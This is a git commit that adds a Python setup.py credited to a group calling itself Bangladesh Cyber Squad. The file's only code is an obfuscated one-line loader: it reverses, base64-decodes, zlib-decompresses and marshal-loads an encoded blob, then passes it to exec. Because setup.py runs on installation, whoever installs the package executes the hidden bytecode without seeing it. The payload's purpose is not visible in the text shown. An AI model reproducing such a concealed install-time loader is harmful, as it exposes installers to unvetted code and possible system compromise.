d6ae0a3507981692a1b5d68affdf094152732f26
Bangladesh Cyber Squad <147122723+TEAMBCS@users.noreply.github.com>
2025-02-18 01:03:03 +0600

    Add files via upload

---
+++ setup.py
@@ -0,0 +1,8 @@
+#_____________________| INFO  |______________________#
+# ENCRYPTED BY :  SHONCHOYON BARUA
+# TEAM : BANGLADESH CYBER SQUAD 
+# PYTHON VERSION : 3.11
+# GITHUB : https://github.com/ADIRTTA
+# TIME  : Tue Feb 18 00:39:35 2025
+#__________________| MAIN MENU  |__________________#
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==gDyigFfZ4dsDq2cgO/dIl4dZQU8G0EA/p+n4XSkcxTH0m6Iay2/e5lfbxQbeuD6zv/6v7iPzu08H/Cxn/Mj6Iu97c9exmaXDKUgbVpVg46ihtGFP5iQgFGlx7AwkH1Vm3Q3kdRjnoUfcROqA7IiDqZeJkXHVh8xOUUw1kQ1KLF5OpQDb9IUUFLcJNrkqMq1RD3px9kOwmpabVjHKKVpYLzLDAqKdLMX/YpwUpy8AaOjrTZH/TdlMgosyT7q4bRCaNZPHG7ZXn5ya7LwmTLaFg2eNQBow4EA4YcfA1wkjllOGpx6La9dtjzpUMtnlz2ad9CurVG2/IzHWkGg5jNYjhZuYbu4PVQHRgcbqQYk0YLrEkIVPLtgH2tbmyUn6QvozadOlr6aaZ84aqweLeb0JjEGFR/EUmVd6oo+NCW9Mk+ZI3qL47fYwiDZbBBokk2bb9LdB7c7bCZTuPIQ9gVM/pnhcri5mDjrNXjPwbbglHBpL8SJRX5m2SMlXBuyNf2KqVjxJac9glyXLv7GtvBFY+z5c+Opg4b85+tVr3rhIaSPC/jyfFx3UyliPS0zA+6/+zLqP/fETUzcyc0Rnp09gUflcVTULlI/m6HQ/rqG2fF6zeDxygGlvMmY6Sq1aO2u4JYDTcjpwGQBTsXG19FD53qNeMBUA1mutcUNxJe'))
